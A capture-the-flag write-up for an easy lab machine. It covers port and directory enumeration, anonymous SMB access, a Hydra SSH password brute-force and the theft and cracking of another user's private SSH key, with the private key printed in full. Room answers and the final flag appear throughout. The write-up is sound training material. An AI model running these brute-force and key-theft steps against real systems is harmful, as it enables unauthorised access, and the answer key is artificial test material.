# Basic Pentesting

## Machine Information

- **Machine Name:** Basic Pentesting
- **Date:** 1/12/2026
- **Completed:** 1/26/2026
- **Attacker OS:** Kali Linux
- **Difficulty:** Easy

* * *

# Room Questions
- Find the services exposed by the machine
- What is the name of the hidden directory on the web server(enter name without /)?
	- development
- User brute-forcing to find the username & password
- What is the username?
	-  `Jan`
- What is the password?
	- `Armando`
- What service do you use to access the server(answer in abbreviation in all caps)?
	- SSH
- Enumerate the machine to find any vectors for privilege escalation
- What is the name of the other user you found(all lower case)?
	- `kay`
- What is the final password you obtain?
	- `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -p- -sS -sC -sV --min-rate 1000 -Pn 10.67.169.68
```

**Open Ports & Services:**

**Target:** 10.66.190.34

**Status:** Host is up (0.046s latency)

**Ports Scanned:** 65,535 TCP

**Closed Ports:** 65,529 (reset)

* * *

### Open Ports &amp; Services

| Port     | State | Service     | Version / Notes                    |
|----------|-------|-------------|------------------------------------|
| 22/tcp   | open  | SSH         | OpenSSH 8.2p1 (Ubuntu 4ubuntu0.13) |
| 80/tcp   | open  | HTTP        | Apache httpd 2.4.41 (Ubuntu)       |
| 139/tcp  | open  | NetBIOS-SSN | Samba smbd 4                       |
| 445/tcp  | open  | NetBIOS-SSN | Samba smbd 4                       |
| 8009/tcp | open  | AJP13       | Apache Jserv Protocol v1.3         |
| 8080/tcp | open  | HTTP        | Apache Tomcat 9.0.7                |

* * *

### SSH Host Keys

```

RSA     3072  ce:a0:0e:45:3c:f7:c4:4b:6c:f8:a2:77:a1:54:a3:9d
ECDSA    256  9e:43:dd:af:37:36:78:e3:a8:61:cd:8c:06:18:33:15
ED25519  256  9d:2f:7e:23:aa:df:d6:0f:31:3a:77:bd:a2:9d:22:6c
```

* * *

### Web Service Details

- **Port 80:** Apache/2.4.41 (Ubuntu)
- **Title:** No title set
- **Port 8080:** Apache Tomcat 9.0.7
- **Favicon:** Apache Tomcat default

* * *

### Samba / NetBIOS Information

```

NetBIOS Name: BASIC2
NetBIOS User: Unknown
SMB Signing: Enabled but not required
```

* * *

### System Information

- **Operating System:** Linux
- **CPE:** cpe:/o:linux:linux\_kernel
- **SMB Time:** 2026-01-12 21:02:42

* * *

## Basic Nmap Notes

The Nmap scan shows that the target machine is online and running a Linux operating system. Several common services are exposed, which increases the attack surface.

* * *

### Key Findings

- The host is reachable and responding normally.
- Multiple services are open, indicating a realistic attack path.
- The system appears to be running Ubuntu Linux.

* * *

### Important Open Ports

- **Port 22 (SSH):** Secure Shell is running. This may be used later if valid credentials are found.
- **Port 80 (HTTP):** A web server is available. This should be enumerated for hidden pages or vulnerabilities.
- **Ports 139 / 445 (SMB):** Samba is running. SMB often allows share enumeration and user discovery.
- **Port 8080 (Tomcat):** Apache Tomcat is exposed. This may allow access to admin panels or default credentials.
- **Port 8009 (AJP):** The Apache JServ Protocol is enabled. This can sometimes be abused to read files.

* * *

### Security Observations

- SMB message signing is enabled but not required, which may allow certain attacks.
- Multiple web services are exposed, increasing the chance of misconfiguration.
- No firewall restrictions are apparent from the scan.

* * *

### Web Enumeration

```bash
gobuster dir -u http://10.67.169.68 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,js -t 50 -r --no-error
```

# Gobuster Directory Enumeration Report

## Scan Details
- **Target URL:** http://10.67.169.68  
- **Tool:** Gobuster v3.8.2  
- **Method:** GET  
- **Threads:** 50  
- **Wordlist:** raft-medium-directories-lowercase.txt  
- **Extensions:** php, html, txt, js  
- **Follow Redirects:** Yes  
- **Timeout:** 10s  

---

## Results

| Path | Status | Size (bytes) | Notes |
|-----|--------|--------------|------|
| /index.html | 200 | 158 | Likely landing page |
| /development | 200 | 1131 | **High-value target – investigate** |
| /server-status | 403 | 277 | Apache status page (restricted) |

---

## Summary
- **Total requests:** 132,915  
- **Interesting findings:** `/development`  
- **Restricted endpoint:** `/server-status`  

Index of /development

# Index of /development
```bash
curl http://10.67.169.68/development/
```

| ![[ICO]](/icons/blank.gif) | [Name](?C=N;O=D) | [Last modified](?C=M;O=A) | [Size](?C=S;O=A) | [Description](?C=D;O=A) |
| --- | --- | --- | --- | --- |
| ![[PARENTDIR]](/icons/back.gif) | [Parent Directory](/) |     | \-  |     |
| ![[TXT]](/icons/text.gif) | [dev.txt](dev.txt) | 2018-04-23 14:52 | 483 |     |
| ![[TXT]](/icons/text.gif) | [j.txt](j.txt) | 2018-04-23 13:10 | 235 |     |

```plaintext
dev.txt

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

```plaintext
j.txt

For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

* * *

## 2. Enumeration

### SMB

```bash
smbclient -L $target -N    

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
```

```bash
# enum4linux Enumeration Report

## Target Information

*   **Target IP:** 10.67.169.68
*   **Tool:** enum4linux v0.9.1
*   **Date:** Jan 13, 2026
*   **Workgroup:** WORKGROUP
*   **Null Session:** **Allowed**

- - -

## Host & OS Details

*   **Hostname:** BASIC2
*   **OS:** Samba Server 4.15.13 (Ubuntu)
*   **Platform ID:** 500
*   **OS Version:** 6.1

**Note:** `//10.67.169.68/Anonymous` is accessible without credentials.

- - -

## Password Policy

*   **Password Complexity:** **Disabled**
*   **Minimum Length:** 5
*   **Password History:** None
*   **Account Lockout:** Not enforced

**High-risk configuration:** Weak password policy + null session access.

- - -

## Enumerated Users

### Local Unix Users

*   kay (UID 1000)
*   jan (UID 1001)
*   ubuntu (UID 1002)

### SMB / Domain Users & Groups

*   BUILTIN\\\\Administrators
*   BUILTIN\\\\Users
*   BUILTIN\\\\Guests
*   BASIC2\\\\nobody

- - -

## Key Findings Summary

*   Null SMB sessions allowed
*   Readable **Anonymous** SMB share
*   Weak password policy (no complexity, short length)
*   Multiple local Unix users discovered

```
```bash
smbclient //10.67.169.68/Anonymous -N

mb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14282840 blocks of size 1024. 6415736 blocks available
smb: \> more staff.txt
```
```plaintext
staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

Let's try enumerating SSH
```Bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.67.169.68 -f
```

```plaintext
What the flags do

-l jan → single known user

-P rockyou.txt → realistic passwords

ssh://10.67.169.68 → SSH service

-f → stop immediately on first hit
```

Hydra output:
```bash
saintmichael@archangelkali~/THM/CTF/easy >hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh:/
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secrethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-25 22:26:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduc
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~8965
[DATA] attacking ssh://10.65.153.6:22/
[STATUS] 250.00 tries/min, 250 tries in 00:01h, 14344150 to do in 956:17h, 15 active
[STATUS] 253.33 tries/min, 760 tries in 00:03h, 14343640 to do in 943:40h, 15 active
[22][ssh] host: 10.65.153.6   login: jan   password: armando
[STATUS] attack finished for 10.65.153.6 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-25 22:29:40
```
* * *

Found password `armando` for user `jan`

## 3. Explore

```bash

jan@ip-10-65-153-6:~$ find /home -type f -readable 2>/dev/null
/home/kay/.profile
/home/kay/.bashrc
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/home/kay/.bash_logout
/home/kay/.sudo_as_admin_successful
/home/ubuntu/.profile
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout
```

## Command Overview

**Command:**

```
find /home -type f -readable 2>/dev/null
```

**Purpose:**  
Enumerate all files under `/home` that the current user can read, to identify leaked credentials, SSH keys, configuration files, or other sensitive data.

### Breakdown

-   `find` — Recursively walks the filesystem and evaluates objects using the current user’s real permissions
-   `/home` — Targets user directories where secrets are commonly stored
-   `-type f` — Limits results to regular files (excludes directories, devices, symlinks)
-   `-readable` — Returns only files readable by the current user (owner, group, or ACL access)
-   `2>/dev/null` — Suppresses permission-denied errors to reduce noise

### Why It’s Effective

-   Leverages the system’s permission model instead of guessing
-   Quickly exposes misconfigurations (e.g., readable private SSH keys)
-   High signal-to-noise for early post-exploitation enumeration

### CTF Relevance

Commonly used for lateral movement discovery without brute force or exploits, often leading to credential reuse or privilege escalation paths.

* * *

## 4. Exploit

### Privilege Escalation

```
jan@ip-10-65-153-6:~$ find /home -type f -readable 2>/dev/null
/home/kay/.profile
/home/kay/.bashrc
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/home/kay/.bash_logout
/home/kay/.sudo_as_admin_successful
/home/ubuntu/.profile
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout
jan@ip-10-65-153-6:~$ cp /home/kay/.ssh/id_rsa /tmp/kay_id_rsa
jan@ip-10-65-153-6:~$ chmod 600 /tmp/kay_id_rsa
jan@ip-10-65-153-6:~$ ls -l /tmp/kay_id_rsa
-rw------- 1 jan jan 3326 Jan 25 22:47 /tmp/kay_id_rsa
jan@ip-10-65-153-6:~$ 
```


We discovered that jan can read files in kay’s home directory, including `~kay/.ssh/id_rsa`. This is a misconfiguration that exposes kay’s private SSH key. Because SSH uses key‑based authentication, possession of this private key allows us to authenticate as kay without a password. The presence of `.sudo_as_admin_successful` indicates that kay has sudo privileges, making this a lateral movement step (jan → kay) that enables subsequent privilege escalation.

```bash
10-64-165-234:/home$ ls -l
total 12
drwxr-xr-x 2 root   root   4096 Apr 23  2018 jan
drwxr-xr-x 5 kay    kay    4096 Apr 23  2018 kay
drwxr-xr-x 3 ubuntu ubuntu 4096 Jan 26 22:12 ubuntu
jan@ip-10-64-165-234:/home$ cd kay
jan@ip-10-64-165-234:/home/kay$ ls -l
total 4
-rw------- 1 kay kay 57 Apr 23  2018 pass.bak
jan@ip-10-64-165-234:/home/kay$ la -a
la: command not found
jan@ip-10-64-165-234:/home/kay$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .lesshst  .nano  pass.bak  .profile  .ssh  .sudo_as_admin_successful  .viminfo
jan@ip-10-64-165-234:/home/kay$ cd .ssh
jan@ip-10-64-165-234:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
jan@ip-10-64-165-234:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----
```

## John the Ripper

```bash
saintmichael@archangelkali~/THM/CTF/easy >ssh2john kay_id_rsa > hash.txt
saintmichael@archangelkali~/THM/CTF/easy >john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_id_rsa)     
1g 0:00:00:00 DONE (2026-01-26 22:20) 33.33g/s 2758Kp/s 2758Kc/s 2758KC/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


jan@ip-10-64-165-234:/home/kay/.ssh$ ssh -i id_rsa kay@localhost
Could not create directory '/home/jan/.ssh'.
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:qq8QFuhX5y1lmxCbJTFhzcjMCojuQaSRLaoyfXKQLYE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 26 Jan 2026 10:21:10 PM EST

  System load:  0.1                Processes:             112
  Usage of /:   50.6% of 13.62GB   Users logged in:       1
  Memory usage: 52%                IPv4 address for eth0: 10.64.165.234
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228
kay@ip-10-64-165-234:~$ ls
pass.bak
kay@ip-10-64-165-234:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```


* * *

## 5. Flags
- **Flag**: heresareallystrongpasswordthatfollowsthepasswordpolicy$$

* * *

